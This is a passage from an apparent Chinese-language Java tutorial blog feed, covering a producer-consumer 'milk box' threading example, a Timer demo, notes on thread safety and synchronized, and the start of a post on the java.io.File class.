class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo01;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  奶箱类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> milk;  <span class="hljs-comment">//第几瓶牛奶</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;   <span class="hljs-comment">//奶箱状态，默认为空</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 生产者放牛奶的功能</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> milk 第几瓶</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(<span class="hljs-type">int</span> milk)</span>&#123;<br>        <span class="hljs-comment">//先判断奶箱的状态，如果有牛奶，则需要等待，如果没有牛奶，则需要生产牛奶</span><br>        <span class="hljs-keyword">if</span>(state)&#123;<span class="hljs-comment">//如果状态为真，说明有牛奶</span><br>            <span class="hljs-keyword">try</span> &#123;<br>                wait(); <span class="hljs-comment">//等待，与sleep不同，wait的等待需要有人去唤醒</span><br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//没有牛奶的部分  state=false</span><br>        <span class="hljs-built_in">this</span>.milk = milk;<br>        System.out.println(<span class="hljs-string">&quot;郭冬临将第：&quot;</span> + <span class="hljs-built_in">this</span>.milk + <span class="hljs-string">&quot;瓶牛奶放进了奶箱&quot;</span>);<br>        <span class="hljs-built_in">this</span>.state = <span class="hljs-literal">true</span>;<span class="hljs-comment">//修改奶箱状态为真</span><br><br>        notifyAll();<span class="hljs-comment">//唤醒全部等到的线程</span><br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 消费者取牛奶</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">get</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">if</span>(!state)&#123;<span class="hljs-comment">//奶箱状态为假，说明奶箱状态为空</span><br>            <span class="hljs-keyword">try</span> &#123;<br>                wait();<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//有牛奶的部分</span><br>        System.out.println(<span class="hljs-string">&quot;小姐姐将第&quot;</span> + <span class="hljs-built_in">this</span>.milk + <span class="hljs-string">&quot;瓶牛奶拿走补了身体&quot;</span>);<br>        <span class="hljs-built_in">this</span>.state = <span class="hljs-literal">false</span>;<span class="hljs-comment">//消费者消费完商品后，需要将奶箱状态修改为空</span><br><br>        notifyAll();<span class="hljs-comment">//唤醒生产者取生产商品</span><br>    &#125;<br>&#125;<br>---------------------------------------------------<br><span class="hljs-keyword">package</span> demo01;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  生产者线程</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Producer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span>&#123;<br>    <span class="hljs-keyword">private</span> Box b;<span class="hljs-comment">//定义奶箱状态</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Producer</span><span class="hljs-params">(Box b)</span> &#123;<br>        <span class="hljs-built_in">this</span>.b = b;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>            b.put(i);<span class="hljs-comment">//生产者放牛奶</span><br>        &#125;<br>    &#125;<br>&#125;<br>-----------------------------------------------------<br><span class="hljs-keyword">package</span> demo01;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  消费者线程</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Customer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span>&#123;<br>    <span class="hljs-keyword">private</span> Box b;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Customer</span><span class="hljs-params">(Box b)</span> &#123;<br>        <span class="hljs-built_in">this</span>.b = b;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            b.get();<br>        &#125;<br>    &#125;<br>&#125;<br>------------------------------------------------------<br><span class="hljs-keyword">package</span> demo01;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  奶箱测试类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MilkBoxTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Box</span> <span class="hljs-variable">box</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Box</span>();<span class="hljs-comment">//实例化奶箱类</span><br><br>        <span class="hljs-type">Producer</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Producer</span>(box);<span class="hljs-comment">//生产者任务类对象</span><br>        <span class="hljs-type">Customer</span> <span class="hljs-variable">customer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Customer</span>(box);<span class="hljs-comment">//消费者任务类对象</span><br><br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">tp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(producer);<span class="hljs-comment">//生产者线程</span><br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(customer);<span class="hljs-comment">//消费者线程</span><br><br>        <span class="hljs-comment">//启动线程</span><br>        tp.start();<br>        tc.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-Timer定时器"><a href="#4-Timer定时器" class="headerlink" title="4 - Timer定时器"></a>4 - Timer定时器</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.text.SimpleDateFormat;<br><span class="hljs-keyword">import</span> java.util.Date;<br><span class="hljs-keyword">import</span> java.util.Timer;<br><span class="hljs-keyword">import</span> java.util.TimerTask;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Timer定时器</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Timer</span> <span class="hljs-variable">timer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Timer</span>();<span class="hljs-comment">//构造定时器对象</span><br>        <span class="hljs-comment">//参数1：布置定时器的任务   参数2：表示启动的时间  参数3：设置循环的时间</span><br>        timer.schedule(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TimerTask</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).format(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()));<br>            &#125;<br>        &#125;,<span class="hljs-number">5000</span>,<span class="hljs-number">1000</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-关于多线程并发环境下，数据的安全问题"><a href="#5-关于多线程并发环境下，数据的安全问题" class="headerlink" title="5-关于多线程并发环境下，数据的安全问题"></a>5-关于多线程并发环境下，数据的安全问题</h2><ul><li>一、为什么是重点<ul><li>项目是运行在服务器当中，服务器已经将线程定义，线程对象的创建，线程的启动等，这些代码不需要编写。<strong>需要注重的是数据在多线程并发的环境下是否是安全的</strong></li></ul></li><li>二、什么时候数据在多线程并发的环境下会存在安全问题<ul><li>1.多线程并发</li><li>2.有共享数据</li><li>3.共享数据有修改行为</li></ul></li><li>三、如何解决线程安全问题<ul><li>当多线程并发的环境下，有共享数据，并且这个数据还会被修改，此时就存在线程安全问题，解决办法：<strong>线程排队执行</strong><strong>(<strong><strong>不能并发</strong></strong>)</strong>。用排队执行解决线程安全问题，这种机制被称为<strong>线程同步</strong>机制。此时会牺牲一部分效率</li></ul></li><li>四、同步编程模型和异步编程模型<ul><li><strong>异步编程模型</strong>：线程A和线程B，各自执行各自的，A不需要等待B，B也不需要等待A。其实就是多线程并发(效率较高)</li><li><strong>同步编程模型</strong>：线程A和线程B，在线程A执行的时候必须等待线程B的执行，或者在线程B执行的时候必须等待线程A的执行结束，两个线程之间发生了等待关系，这就是同步编程模型，效率较低，线程排队执行</li></ul></li><li>五、Java中的三大变量<ul><li>实例变量：在堆内存中</li><li>静态变量：在方法区中</li><li>局部变量：在栈内存中</li><li>以上三大变量中<strong>局部变量永远不会存在线程安全问题</strong>，因为局部变量不共享，实例变量和静态变量，一个在堆内存中一个在方法区中，<strong>堆和方法区都是多线程共享的，所以可能存在线程安全问题</strong></li></ul></li><li>六、如何解决线程安全问题<ul><li>使用synchronized(共享的对象){<ul><li>同步线程代码块</li></ul></li><li>}</li></ul></li><li>七、在实例方法上可以使用synchronized，并且出现在实例方法上，一定锁的是this，不能是其他对象所以这种方式不灵活。另外还有一个缺点：synchronized出现在实例方法上表示整个方法体需要同步，可能会无故扩大同步范围，导致程序执行效率降低。如果共享的对象是this，并且需要同步的代码块是整个方法体，建议使用这种方式。<ul><li>synchronized出现在静态方法是类锁，不管创建了几个对象，类锁只有一把</li></ul></li><li>八、ArrayList，HashMap,HashSet是非线程安全的；Vector，Hashtable是线程安全的</li><li>九、synchronized会让程序的执行效率降低，用户体验感不好，系统的用户吞吐量降低，用户体验感差，在不得已的情况下在选择线程同步机制<ul><li>第一种方案：尽量使用局部变量代替实例变量和静态变量</li><li>第二种方案：如果必须是实例变量，那么可以考虑创建多个对象，这样实例变量的内存就不共享</li><li>第三种方案：如果不能使用局部变量，对象也不能创建多个，这个时候只能选择synchronized，线程同步机制</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSe</tag>
      
      <tag>面向对象</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSe基础---IO流</title>
    <link href="/2020/05/11/JavaSe%E5%9F%BA%E7%A1%80---IO%E6%B5%81/"/>
    <url>/2020/05/11/JavaSe%E5%9F%BA%E7%A1%80---IO%E6%B5%81/</url>
    
    <content type="html"><![CDATA[<h2 id="1-File类"><a href="#1-File类" class="headerlink" title="1 - File类"></a>1 - File类</h2><h3 id="1-1-基本概念"><a href="#1-1-基本概念" class="headerlink" title="1.1 - 基本概念"></a>1.1 - 基本概念</h3><pre><code class="hljs">java.io.File类用于描述文件和目录的路径信息，可以获取文件大小等相关属性。</code></pre><h3 id="1-2-构造方法"><a href="#1-2-构造方法" class="headerlink" title="1.2 - 构造方法"></a>1.2 - 构造方法</h3><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>File(String pathname)</code></td><td>通过给定的路径名转换为File对象</td></tr><tr><td><code>File(String parent,String child)</code></td><td>从父类的路径名和子类的文件名来创建一个File对象</td></tr><tr><td><code>File(File parent,String child)</code></td><td>从父类的Flie目录和子类的文件名来创建一个File对象</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  File对象的构造器</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//        相对路径与绝对路径</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        相对路径：相对于当前目录的某一级目录</span><br><span class="hljs-comment">        当前路径表示为：  ./   (Idea)默认从项目根目录开始查找</span><br><span class="hljs-comment">        上一级目录表示为：../</span><br><span class="hljs-comment">        上一级的上一级目录表示为：../../</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        绝对路径：从磁盘根目录开始查找</span><br><span class="hljs-comment">        E:\\workingspace\\bjpn2209\\com.bjpowernode.day06.file\\src\\Demo02.java</span><br><span class="hljs-comment">        E:/workingspace/bjpn2209/com.bjpowernode.day06.file/src/Demo02.java</span><br><span class="hljs-comment">        * */</span><br><br>        <span class="hljs-comment">//与文件向关联，并不会创建或获取文件</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;./myTest.txt&quot;</span>);<br>        System.out.println(file);<br><br>        <span class="hljs-comment">//第一个参数是路径，第二个参数是要操作的目标文件名</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;./&quot;</span>, <span class="hljs-string">&quot;myTest.txt&quot;</span>);<br>        System.out.println(file1);<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;./&quot;</span>);<span class="hljs-comment">//将路径构造成File对象</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(file2, <span class="hljs-string">&quot;myTest.txt&quot;</span>);<br>        System.out.println(file3);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="c27a3d0c"></a></p><h3 id="1-3-File类的创建功能"><a href="#1-3-File类的创建功能" class="headerlink" title="1.3 - File类的创建功能"></a>1.3 - File类的创建功能</h3><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>boolean createNewFile()</code></td><td>创建文件</td></tr><tr><td><code>boolean mkdir()</code></td><td>创建目录（单个）</td></tr><tr><td><code>boolean mkdirs()</code></td><td>创建目录（多级）</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO File类的创建功能</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//创建文件前需要与文件相关联</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;./myTest.txt&quot;</span>);<br>        <span class="hljs-keyword">if</span> (file.createNewFile())&#123;<br>            System.out.println(<span class="hljs-string">&quot;文件创建成功！&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;文件创建失败！&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">//创建单个目录，先构造File对象，与目录相关联</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">myDir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;./&quot;</span>, <span class="hljs-string">&quot;myDir&quot;</span>);<br>        <span class="hljs-comment">//创建多级目录的方式可以创建单个目录</span><br>        <span class="hljs-keyword">if</span> (myDir.mkdirs())&#123;<br>            System.out.println(<span class="hljs-string">&quot;目录创建成功！&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;目录创建失败！&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;./H/E/L/L/O&quot;</span>);<br>        <span class="hljs-comment">//创建单个目录的方式不能创建多级目录的</span><br><span class="hljs-comment">//        if (file1.mkdir())&#123;</span><br>        <span class="hljs-keyword">if</span> (file1.mkdirs())&#123;<br>            System.out.println(<span class="hljs-string">&quot;多级目录创建成功~&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;多级目录创建失败~&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="48e68535"></a></p><h3 id="1-4-File类的常用功能"><a href="#1-4-File类的常用功能" class="headerlink" title="1.4 - File类的常用功能"></a>1.4 - File类的常用功能</h3><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>boolean isDirectory()</code></td><td>判断一个File对象指向的是否是一个目录</td></tr><tr><td><code>boolean isFile()</code></td><td>判断一个File对象指向的是否是一个文件</td></tr><tr><td><code>boolean exists()</code></td><td>判断一个File对象指向的文件或目录是否存在，存在则返回true</td></tr><tr><td><code>String getAbsolutePath()</code></td><td>获取File对象指向的文件或目录的绝对路径</td></tr><tr><td><code>String getPath()</code></td><td>获取创建File对象时候使用的路径和文件名</td></tr><tr><td><code>String getName()</code></td><td>获取创建FIle对象的文件名</td></tr><tr><td><code>String getParent（）</code></td><td>获取创建File对象所在的目录名</td></tr><tr><td><code>File[] listFiles()</code></td><td>获取File对象中所有的文件（File对象形式）</td></tr><tr><td><code>long lastModified()</code></td><td>获取到File对象中文件最后被修改的时间</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.text.SimpleDateFormat;<br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  File类中的常用功能</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//先构造一些File对象与目录或文件向关联</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;./&quot;</span>);<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;./a.txt&quot;</span>);<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;./myTest.txt&quot;</span>);<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;./myDir&quot;</span>);<br><br>        <span class="hljs-comment">//判断是否是目录</span><br>        System.out.println(file.isDirectory());<span class="hljs-comment">//true</span><br>        System.out.println(file1.isDirectory());<br>        System.out.println(file2.isDirectory());<br>        System.out.println(file3.isDirectory());<span class="hljs-comment">//true</span><br>        System.out.println(<span class="hljs-string">&quot;----------------------------------------------&quot;</span>);<br>        <span class="hljs-comment">//判断是否是文件</span><br>        System.out.println(file.isFile());<span class="hljs-comment">//false</span><br>        System.out.println(file1.isFile());<span class="hljs-comment">//false,因为文件不存在，所以并不能确定是文件</span><br>        System.out.println(file2.isFile());<span class="hljs-comment">//true</span><br>        System.out.println(file3.isFile());<span class="hljs-comment">//false</span><br>        System.out.println(<span class="hljs-string">&quot;----------------------------------------------&quot;</span>);<br>        <span class="hljs-comment">//判断是否存在</span><br>        System.out.println(file.exists());<br>        System.out.println(file1.exists());<span class="hljs-comment">//false</span><br>        System.out.println(file2.exists());<br>        System.out.println(file3.exists());<br>        System.out.println(<span class="hljs-string">&quot;----------------------------------------------&quot;</span>);<br>        <span class="hljs-comment">//获取绝对路径</span><br>        System.out.println(file.getAbsolutePath());<br>        System.out.println(file1.getAbsolutePath());<br>        System.out.println(file2.getAbsolutePath());<br>        System.out.println(file3.getAbsolutePath());<br>        System.out.println(<span class="hljs-string">&quot;----------------------------------------------&quot;</span>);<br>        <span class="hljs-comment">//获取相对路径，会根据构造FIle对象时参数决定的</span><br>        System.out.println(file.getPath());<br>        System.out.println(file1.getPath());<br>        System.out.println(file2.getPath());<br>        System.out.println(file3.getPath());<br>        System.out.println(<span class="hljs-string">&quot;----------------------------------------------&quot;</span>);<br>        <span class="hljs-comment">//获取文件后目录名</span><br>        System.out.println(file.getName());<br>        System.out.println(file1.getName());<br>        System.out.println(file2.getName());<br>        System.out.println(file3.getName());<br>        System.out.println(<span class="hljs-string">&quot;----------------------------------------------&quot;</span>);<br>        <span class="hljs-comment">//获取当前文件所在的目录</span><br>        System.out.println(file.getParent());<br>        System.out.println(file1.getParent());<br>        System.out.println(file2.getParent());<br>        System.out.println(file3.getParent());<br>        System.out.println(<span class="hljs-string">&quot;----------------------------------------------&quot;</span>);<br>        <span class="hljs-comment">//listFiles，查看目录中的所有文件</span><br>        File[] files = file.listFiles();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; files.length; i++) &#123;<br>            System.out.println(files[i]);<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;----------------------------------------------&quot;</span>);<br>        <span class="hljs-comment">//获取文件最后被修改的时间</span><br>        <span class="hljs-type">Date</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(file2.lastModified());<span class="hljs-comment">//将long的毫秒数构造成Date对象</span><br>        <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">sdf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);<span class="hljs-comment">//构造格式化输出的对象</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">format</span> <span class="hljs-operator">=</span> sdf.format(date);<span class="hljs-comment">//将date对象按照调用对象的格式进行格式化输出，并以字符串形式返回</span><br>        System.out.println(format);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="3ce108d4"></a></p><h3 id="1-5-File类的删除功能"><a href="#1-5-File类的删除功能" class="headerlink" title="1.5 - File类的删除功能"></a>1.5 - 